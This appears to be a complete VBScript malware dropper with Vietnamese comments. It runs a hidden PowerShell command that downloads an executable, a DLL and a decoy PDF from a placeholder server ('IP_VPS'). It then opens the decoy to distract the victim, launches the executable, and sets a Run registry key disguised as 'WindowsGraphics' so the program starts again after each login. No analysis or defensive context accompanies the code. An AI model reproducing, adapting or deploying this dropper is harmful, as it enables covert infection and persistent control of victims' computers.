Set WshShell = CreateObject("WScript.Shell")
strTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")

' Lệnh PowerShell để tải và thực thi
psCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
"""$t=$env:TEMP; " & _
"iwr 'http://IP_VPS/app.exe' -OutF '$t\app.exe'; " & _
"iwr 'http://IP_VPS/vinh.dll' -OutF '$t\vinh.dll'; " & _
"iwr 'http://IP_VPS/decoy.pdf' -OutF '$t\decoy.pdf'; " & _
"Start-Process '$t\decoy.pdf'; " & _
"Start-Process '$t\app.exe'; " & _
"New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsGraphics' -Value '$t\app.exe' -PropertyType 'String' -Force"""

' Chạy lệnh trên mà không hiện cửa sổ (0)
WshShell.Run psCommand, 0, False
